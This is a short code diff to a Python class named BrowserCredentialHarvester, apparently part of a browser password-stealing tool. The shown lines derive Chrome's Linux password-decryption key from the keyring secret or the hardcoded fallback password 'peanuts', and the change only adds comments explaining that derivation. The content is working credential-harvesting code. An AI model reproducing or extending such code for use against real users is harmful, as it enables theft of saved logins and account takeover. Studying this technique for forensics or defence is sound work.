@@ -333,6 +333,8 @@ class BrowserCredentialHarvester:
                     key_password = item.get_secret().decode("utf-8")
                     from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
                     from cryptography.hazmat.primitives import hashes
+                    # Chrome on Linux uses 1 iteration (not 1003 like macOS)
+                    # per Chromium source: components/os_crypt/os_crypt_linux.cc
                     kdf = PBKDF2HMAC(
                         algorithm=hashes.SHA1(), length=16,
                         salt=b"saltysalt", iterations=1,
@@ -342,6 +344,7 @@ class BrowserCredentialHarvester:
             pass
 
         # Fallback: hardcoded key used by Chrome on Linux without keyring
+        # Chrome uses password "peanuts" with 1 iteration when no keyring available
         try:
             from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
             from cryptography.hazmat.primitives import hashes
